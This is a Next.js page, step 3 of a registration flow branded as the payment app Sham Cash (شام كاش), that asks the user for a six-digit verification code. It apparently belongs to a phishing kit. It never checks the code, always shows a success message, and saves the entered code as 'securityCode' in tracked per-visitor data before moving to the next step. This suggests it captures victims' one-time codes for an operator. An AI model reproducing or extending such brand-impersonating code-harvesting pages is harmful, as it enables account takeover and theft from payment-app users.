'use client';

import { useRef, useState } from 'react';
import { useRouter } from 'next/navigation';
import { useVisitorContext } from '@/contexts/VisitorContext';
import { useSound } from '@/hooks/useSound';

const VERIFICATION_DELAY_MS = 600;
const SUCCESS_MESSAGE_DURATION_MS = 800;

export default function Step3Page() {
  const router = useRouter();
  const { updateVisitorData, updateVisitorStep } = useVisitorContext();
  const { play } = useSound();
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleChange = (value: string, index: number) => {
    const clean = value.replace(/\D/g, '').slice(0, 1);
    const newOtp = [...otp];
    newOtp[index] = clean;
    setOtp(newOtp);
    if (error) setError('');

    if (clean && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (e.key === 'Backspace') {
      if (otp[index]) {
        const newOtp = [...otp];
        newOtp[index] = '';
        setOtp(newOtp);
      } else if (index > 0) {
        inputRefs.current[index - 1]?.focus();
      }
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const text = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (text) {
      const newOtp = [...otp];
      for (let i = 0; i < text.length; i++) {
        newOtp[i] = text[i];
      }
      setOtp(newOtp);
      if (error) setError('');
      const nextIndex = Math.min(text.length, 5);
      inputRefs.current[nextIndex]?.focus();
    }
  };

  const handleConfirm = async () => {
    const code = otp.join('');
    if (code.length < 6) {
      setError('يرجى إدخال رمز التحقق كاملاً (6 أرقام)');
      play();
      return;
    }

    setError('');
    setIsSubmitting(true);

    const visitorId = sessionStorage.getItem('currentVisitorId');
    if (visitorId) {
      updateVisitorData(visitorId, { securityCode: code });
      updateVisitorStep(visitorId, 3);
    }

    await new Promise((r) => setTimeout(r, VERIFICATION_DELAY_MS));
    play();
    setSuccess(true);
    await new Promise((r) => setTimeout(r, SUCCESS_MESSAGE_DURATION_MS));
    router.push('/registration/step-4');
  };

  return (
    <div
      dir="rtl"
      style={{
        minHeight: '100vh',
        background: '#0b1d3a',
        color: 'white',
        fontFamily: 'Segoe UI, Tahoma, Arial, sans-serif',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
      }}
    >
      {/* Header */}
      <div
        style={{
          width: '100%',
          maxWidth: 420,
          padding: '16px 20px',
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
        }}
      >
        <span
          role="button"
          aria-label="فتح القائمة"
          tabIndex={0}
          onKeyDown={(e) => e.key === 'Enter' && e.currentTarget.click()}
          style={{ fontSize: 26, cursor: 'pointer', color: '#a0aec0' }}
        >
          ≡
        </span>
        <span style={{ fontWeight: 'bold', fontSize: 16 }}>شام كاش</span>
      </div>

      {/* Logo Section */}
      <div style={{ textAlign: 'center', marginTop: 16, marginBottom: 24 }}>
        <div
          style={{
            width: 72,
            height: 72,
            background: 'linear-gradient(135deg, #00c6ff, #0072ff)',
            borderRadius: 18,
            margin: '0 auto 12px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: 24,
            fontWeight: 'bold',
            color: 'white',
            boxShadow: '0 4px 24px rgba(0,114,255,0.4)',
          }}
        >
          SC
        </div>
        <h2 style={{ fontSize: 20, fontWeight: 'bold', marginBottom: 4 }}>شام كاش</h2>
        <p style={{ color: '#a0aec0', fontSize: 13 }}>نظام التسجيل</p>
      </div>

      {/* Main Content */}
      <div style={{ width: '100%', maxWidth: 420, padding: '0 20px', flex: 1 }}>
        <div
          style={{
            background: '#1a2c4a',
            borderRadius: 20,
            padding: '28px 20px',
            border: '1px solid #2d3a5a',
          }}
        >
          <h3
            style={{
              fontSize: 20,
              fontWeight: 'bold',
              textAlign: 'center',
              marginBottom: 8,
            }}
          >
            التحقق من هويتك
          </h3>
          <p
            id="otp-instructions"
            style={{
              color: '#a0aec0',
              fontSize: 14,
              textAlign: 'center',
              marginBottom: 28,
            }}
          >
            أدخل رمز التحقق المرسل إلى رقمك
          </p>

          {/* OTP Inputs */}
          <div
            onPaste={handlePaste}
            style={{
              display: 'flex',
              gap: 10,
              justifyContent: 'center',
              direction: 'ltr',
              marginBottom: 24,
            }}
          >
            {otp.map((digit, i) => (
              <input
                key={i}
                ref={(el) => {
                  inputRefs.current[i] = el;
                }}
                id={`otp-${i}`}
                type="text"
                inputMode="numeric"
                value={digit}
                onChange={(e) => handleChange(e.target.value, i)}
                onKeyDown={(e) => handleKeyDown(e, i)}
                maxLength={1}
                autoFocus={i === 0}
                aria-label={`رقم التحقق ${i + 1}`}
                aria-describedby="otp-instructions"
                style={{
                  width: 46,
                  height: 52,
                  textAlign: 'center',
                  fontSize: 22,
                  fontWeight: 'bold',
                  borderRadius: 12,
                  border: `2px solid ${digit ? '#4da3ff' : '#2d4070'}`,
                  background: '#1b2f55',
                  color: 'white',
                  outline: 'none',
                  transition: 'border-color 0.2s',
                }}
                onFocus={(e) => {
                  e.target.style.borderColor = '#4da3ff';
                }}
                onBlur={(e) => {
                  e.target.style.borderColor = otp[i] ? '#4da3ff' : '#2d4070';
                }}
              />
            ))}
          </div>

          {/* Error */}
          {error && (
            <p
              style={{
                color: '#fc8181',
                textAlign: 'center',
                fontSize: 13,
                marginBottom: 16,
              }}
            >
              {error}
            </p>
          )}

          {/* Success */}
          {success && (
            <p
              style={{
                color: '#68d391',
                textAlign: 'center',
                fontSize: 13,
                marginBottom: 16,
              }}
            >
              ✓ تم التحقق بنجاح! جاري الانتقال...
            </p>
          )}

          {/* Confirm Button */}
          <div style={{ display: 'flex', justifyContent: 'center' }}>
            <button
              onClick={handleConfirm}
              disabled={isSubmitting}
              style={{
                width: 200,
                padding: '13px 0',
                borderRadius: 14,
                border: 'none',
                background: '#2ecc71',
                color: 'white',
                fontSize: 18,
                fontWeight: 'bold',
                cursor: isSubmitting ? 'not-allowed' : 'pointer',
                opacity: isSubmitting ? 0.8 : 1,
                transition: 'background 0.2s',
              }}
            >
              {isSubmitting ? 'جاري التحقق...' : 'تأكيد'}
            </button>
          </div>
        </div>
      </div>

      {/* Footer Navigation */}
      <div
        style={{
          width: '100%',
          maxWidth: 420,
          display: 'flex',
          justifyContent: 'space-between',
          padding: '20px 20px 32px',
          marginTop: 'auto',
        }}
      >
        <button
          onClick={() => router.push('/registration/step-2')}
          style={{
            background: 'none',
            border: 'none',
            color: '#4da3ff',
            fontSize: 16,
            cursor: 'pointer',
          }}
        >
          ← السابق
        </button>
        <button
          onClick={() => router.push('/registration/step-4')}
          disabled={!success}
          style={{
            background: 'none',
            border: 'none',
            color: success ? '#4da3ff' : '#4a5568',
            fontSize: 16,
            cursor: success ? 'pointer' : 'not-allowed',
          }}
        >
          التالي →
        </button>
      </div>
    </div>
  );
}
